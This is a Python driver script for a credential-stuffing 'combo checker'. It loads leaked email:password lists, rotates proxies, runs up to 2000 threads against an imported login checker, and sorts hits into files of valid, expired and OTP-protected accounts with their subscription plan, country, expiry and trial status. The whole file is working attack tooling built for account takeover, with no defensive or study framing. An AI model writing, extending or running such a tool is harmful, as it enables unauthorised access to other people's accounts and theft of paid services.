#!/usr/bin/env python3
import os, sys, re, json, time, threading, concurrent.futures
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
os.chdir(os.path.dirname(os.path.abspath(__file__)))
from src.checker import check_account
from src.proxy import ProxyManager
from src import ui

em = re.compile(r"^[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}$")


def args(argv):
    c = {"combo": None, "proxy_file": None, "threads": 20, "outdir": "results",
         "debug": False, "resume": False, "country": None, "otp_retry": None}
    i = 1
    while i < len(argv):
        a = argv[i]
        if a in ("-h", "--help"):
            ui.usage()
        elif a in ("-t", "--threads"):
            i += 1
            try: c["threads"] = max(1, min(2000, int(argv[i])))
            except ValueError: c["threads"] = 20
        elif a.startswith("--threads="):
            try: c["threads"] = max(1, min(2000, int(a.split("=", 1)[1])))
            except ValueError: pass
        elif a in ("-o", "--output"):
            i += 1; c["outdir"] = argv[i]
        elif a == "--debug":
            c["debug"] = True
        elif a == "--resume":
            c["resume"] = True
        elif a == "--country":
            i += 1; c["country"] = argv[i].upper()
        elif a == "--otp-retry":
            i += 1
            try: c["otp_retry"] = max(0, min(50, int(argv[i])))
            except ValueError: c["otp_retry"] = 1
        elif a.startswith("--otp-retry="):
            try: c["otp_retry"] = max(0, min(50, int(a.split("=", 1)[1])))
            except ValueError: c["otp_retry"] = 1
        elif a.startswith("-"):
            print("unknown option " + a); ui.usage()
        elif c["combo"] is None:
            c["combo"] = a
        elif c["proxy_file"] is None and os.path.isfile(a):
            c["proxy_file"] = a
        else:
            c["outdir"] = a
        i += 1
    if not c["combo"]:
        ui.usage()
    return c


def otp_prompt(default=2):
    if not sys.stdin.isatty():
        return default
    try:
        raw = input("  otp retries per account [" + str(default) + "]: ").strip()
    except (EOFError, KeyboardInterrupt):
        return default
    if not raw:
        return default
    try:
        n = int(raw)
        if n < 0: n = 0
        if n > 50: n = 50
        return n
    except ValueError:
        return default


def load_combos(path):
    raw = []
    try:
        f = open(path, "r", encoding="utf-8", errors="ignore")
        for line in f:
            line = line.strip()
            if ":" in line and "@" in line:
                raw.append(line)
        f.close()
    except OSError as e:
        print("cannot read combo file " + str(e)); sys.exit(1)
    seen = set(); out = []; dup = 0; bad = 0
    for line in raw:
        p = line.split(":", 1)
        if len(p) != 2:
            bad += 1; continue
        mail, pw = p[0].strip(), p[1]
        if not em.match(mail) or not pw:
            bad += 1; continue
        k = (mail.lower(), pw)
        if k in seen:
            dup += 1; continue
        seen.add(k); out.append((mail, pw))
    return out, dup, bad


def save(outdir, r):
    if not r: return
    s = r.get("status", ""); line = r.get("account", "")
    if s == "VALID":
        plan = r.get("plan", ""); cc = r.get("country", ""); exp = r.get("expires", "")
        dl = r.get("days_left", ""); ar = "AUTO" if r.get("auto_renew") else "MANUAL"
        ft = " [TRIAL]" if r.get("is_free_trial") else ""
        f = open(os.path.join(outdir, "valid.txt"), "a")
        f.write(line + " | " + plan + ft + " | " + cc + " | exp:" + str(exp) + " (" + str(dl) + "d) | " + ar + "\n")
        f.close()
    elif s == "EXPIRED":
        plan = r.get("plan", ""); cc = r.get("country", ""); exp = r.get("expires", "")
        f = open(os.path.join(outdir, "expired.txt"), "a")
        f.write(line + " | " + plan + " | " + cc + " | exp:" + str(exp) + "\n")
        f.close()
    elif s == "OTP":
        f = open(os.path.join(outdir, "otp.txt"), "a")
        f.write(line + " | " + r.get("info", "") + "\n"); f.close()
    elif s == "RESET":
        f = open(os.path.join(outdir, "reset.txt"), "a")
        f.write(line + " | " + r.get("info", "") + "\n"); f.close()
    elif s == "INVALID":
        f = open(os.path.join(outdir, "invalid.txt"), "a")
        f.write(line + " | " + r.get("info", "") + "\n"); f.close()
    elif s == "UNKNOWN":
        f = open(os.path.join(outdir, "unknown.txt"), "a")
        f.write(line + " | " + r.get("info", "") + "\n"); f.close()


def save_prog(outdir, idx):
    try:
        f = open(os.path.join(outdir, "progress.json"), "w")
        json.dump({"last_index": idx}, f); f.close()
    except: pass


def load_prog(outdir):
    try:
        f = open(os.path.join(outdir, "progress.json"), "r")
        n = json.load(f).get("last_index", 0); f.close(); return n
    except: return 0


def main():
    c = args(sys.argv)
    ui.clear(); ui.banner()
    combos, dup, bad = load_combos(c["combo"])
    if not combos:
        print("no combos loaded"); return
    print("loaded " + str(len(combos)) + " combos")
    if dup or bad:
        print("cleanup removed " + str(dup) + " dupes and " + str(bad) + " invalid")
    pm = None
    if c["proxy_file"]:
        pm = ProxyManager()
        n = pm.load_file(c["proxy_file"])
        if n > 0: print("loaded " + str(n) + " proxies")
        else: print("no proxies loaded using direct"); pm = None
    else:
        print("no proxy file using direct")

    if c["otp_retry"] is None:
        c["otp_retry"] = otp_prompt(1)

    os.makedirs(c["outdir"], exist_ok=True)
    if not c["resume"]:
        for f in ["valid.txt", "expired.txt", "otp.txt", "reset.txt", "invalid.txt",
                  "unknown.txt", "error.txt", "tokens.txt", "tokens.jsonl",
                  "report.json", "progress.json"]:
            p = os.path.join(c["outdir"], f)
            if os.path.exists(p): os.remove(p)
    start = load_prog(c["outdir"]) if c["resume"] else 0
    if start >= len(combos): start = 0
    elif start > 0: print("resuming from " + str(start + 1) + "/" + str(len(combos)))
    work = combos[start:]
    psize = pm.size() if pm else 0
    ui.config(len(work), c["threads"], psize, c["country"], c["outdir"], c["debug"], c["resume"], c["otp_retry"])
    print()
    if not sys.stdin.isatty(): print("press enter to start")
    else: input("press enter to start ")
    print()

    t0 = time.time()
    cnt = {"valid": 0, "expired": 0, "otp": 0, "reset": 0, "invalid": 0, "unknown": 0, "error": 0}
    cstats = {}
    fl = threading.Lock()
    done = [0]
    total = len(work)
    lines = []
    otp_retry = c["otp_retry"]

    def run(mail, pw):
        return check_account(mail, pw, pm, debug=c["debug"], otp_retry=otp_retry)

    with concurrent.futures.ThreadPoolExecutor(max_workers=c["threads"]) as ex:
        futs = {ex.submit(run, m, p): (m, p) for m, p in work}
        for fu in concurrent.futures.as_completed(futs):
            try:
                r = fu.result(timeout=120)
            except Exception as e:
                m, p = futs[fu]
                r = {"account": m + ":" + p, "status": "UNKNOWN", "info": str(e)[:60], "country": "?"}
            with fl:
                s = r.get("status", "")
                sl = s.lower()
                if sl in cnt: cnt[sl] += 1
                cc = r.get("country", "?")
                if cc and cc != "?":
                    cstats[cc] = cstats.get(cc, 0) + 1
                save(c["outdir"], r)
                done[0] += 1
                if s in ("VALID", "EXPIRED", "OTP", "RESET"):
                    lines.append(ui.fline(r))
                el = time.time() - t0
                cpm = done[0] / max(el, 1) * 60
                eta = (total - done[0]) / max(cpm / 60, 0.01)
                bw = 26
                filled = int(bw * done[0] / max(total, 1))
                bar = ui.CV + "=" * filled + ui.CD + "-" * (bw - filled) + ui.CR
                pct = done[0] * 100 // max(total, 1)
                if eta < 60: es = str(int(eta)) + "s"
                elif eta < 3600: es = str(int(eta // 60)) + "m" + str(int(eta % 60)) + "s"
                else: es = str(int(eta // 3600)) + "h" + str(int((eta % 3600) // 60)) + "m"
                ln = ("\r  " + bar + " " + str(pct).rjust(3) + "%  [" + str(done[0]) + "/" + str(total) + "]  "
                      + str(int(cpm)) + " cpm  eta " + es + "  "
                      + "v:" + str(cnt["valid"]) + " e:" + str(cnt["expired"]) + " "
                      + "o:" + str(cnt["otp"]) + " r:" + str(cnt["reset"]) + " "
                      + "i:" + str(cnt["invalid"]) + "  ")
                sys.stdout.write(ln); sys.stdout.flush()
            if done[0] % 50 == 0:
                save_prog(c["outdir"], start + done[0])

    save_prog(c["outdir"], len(combos))
    sys.stdout.write("\n")
    if lines:
        print()
        for l in lines:
            print(l, flush=True)
    el = time.time() - t0
    pst = pm.stats() if pm else None
    ui.summary(cnt, len(work), el, c["outdir"], pst, cstats)
    rep = {"total": len(work), "valid": cnt["valid"], "expired": cnt["expired"],
           "otp": cnt["otp"], "reset": cnt.get("reset", 0), "invalid": cnt["invalid"],
           "unknown": cnt["unknown"], "error": cnt["error"],
           "elapsed": round(el, 1), "cpm": round(len(work) / max(el, 1), 1),
           "otp_retry": otp_retry}
    try:
        f = open(os.path.join(c["outdir"], "report.json"), "w")
        json.dump(rep, f, indent=2); f.close()
    except: pass


if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt:
        print("\nstopped"); sys.exit(0)
